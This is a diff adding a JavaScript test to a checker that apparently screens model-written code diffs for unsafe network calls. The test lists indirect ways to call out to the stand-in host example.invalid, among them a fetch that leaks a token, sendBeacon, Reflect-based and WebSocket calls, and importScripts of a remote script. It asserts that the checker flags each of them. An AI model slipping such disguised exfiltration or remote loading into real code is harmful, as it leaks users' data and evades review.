@@ -203,3 +203,21 @@ test('independent Security blocks optional browser network calls and EventSource
   }
   assert.equal(inspectModelDiff({ ...input, diff: '+const networkStatusLabel = "Ready";' }).status, 'passed');
 });
+
+test('independent Security blocks indirect network calls and Reflect invocation', () => {
+  const attempts = [
+    'fetch.call(globalThis, "https://example.invalid/?data=" + token);',
+    'navigator.sendBeacon.apply(navigator, ["https://example.invalid", data]);',
+    'globalThis["fetch"]["call"](globalThis, unsafeUrl);',
+    'Reflect.apply(fetch, globalThis, [unsafeUrl]);',
+    'Reflect.construct(WebSocket, ["wss://example.invalid"]);',
+    'new WebSocket("wss://example.invalid");',
+    'importScripts("https://example.invalid/remote.js");'
+  ];
+  for (const addition of attempts) {
+    const verdict = inspectModelDiff({ ...input, diff: '+' + addition });
+    assert.equal(verdict.status, 'failed', addition);
+    assert.ok(verdict.findings.includes('Potentially unsafe new code'), addition);
+  }
+  assert.equal(inspectModelDiff({ ...input, diff: '+const label = "Safe local status";' }).status, 'passed');
+});
